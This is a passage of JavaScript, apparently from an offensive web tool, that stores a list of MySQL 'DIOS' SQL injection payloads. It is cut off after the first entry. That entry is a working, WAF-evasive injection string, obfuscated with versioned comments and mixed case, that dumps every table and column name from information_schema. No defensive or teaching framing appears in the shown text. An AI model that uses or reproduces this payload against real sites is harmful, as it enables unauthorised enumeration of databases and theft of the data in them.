document.addEventListener('DOMContentLoaded', function() {
    ...
    const predatorData = {
        ...
        mysqldios: [
            { name: "DIOS1", code: "(/*!00024SeLeCt/**8**/*/(@x)/*!00024from/**8**/*/(/*!00024SeLeCt/**8**/*/(@x:=0x00),(SeLeCt(0)/*!From/**8**/*/(/*!00024information_schema.columns/**8**/*/)/*!00024where/**8**/*/(table_schema=database/*data*//**8*/())and(0x00)in(@x:=/*!00024coNcat/**8**/*/(@x,0x3c6c693e,/*!00024table_name/**8**/*/,0x3a3a,/*!00024column_name/**8**/*/))))x)" },
